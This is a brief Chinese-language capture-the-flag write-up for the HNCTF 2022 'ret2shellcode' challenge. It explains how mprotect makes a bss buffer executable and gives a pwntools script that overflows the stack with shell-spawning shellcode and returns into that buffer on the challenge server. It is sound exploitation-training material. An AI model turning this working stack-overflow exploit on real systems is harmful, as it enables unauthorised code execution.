[[HNCTF 2022 Week1]ret2shellcode | NSSCTF](https://www.nssctf.cn/problem/2934)
源码及ida
![[Pasted image 20240815230835.png]]
可见为开启了NX保护，但题目提示为ret2shellcode类型题目
![[Pasted image 20240815230904.png]]
s在栈上，buff在bss段
![[Pasted image 20240815231353.png]]
关键函数mprotect(void *addr, size_t len, int prot)
主要关注参数prot：  
r:4  
w:2  
x:1  
prot为7（1+2+4）就是rwx可读可写可执行
即rwx为二进制111，全开

将断点下在mprotect函数，此时查看权限，发现仅有读写权限
![[Pasted image 20240815231451.png]]
步进后发现有了执行权限
![[Pasted image 20240815231537.png]]
故可将shellcode写入buff中执行
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
#p = process('./ret2shellcode_nss_1')
p = remote("node5.anna.nssctf.cn", 26165)

shellcode = asm(shellcraft.sh())
buff = 0x4040A0

payload = flat([shellcode, 'a' * (0x100 + 8 - len(shellcode)), buff])

p.sendline(payload)
p.interactive()
```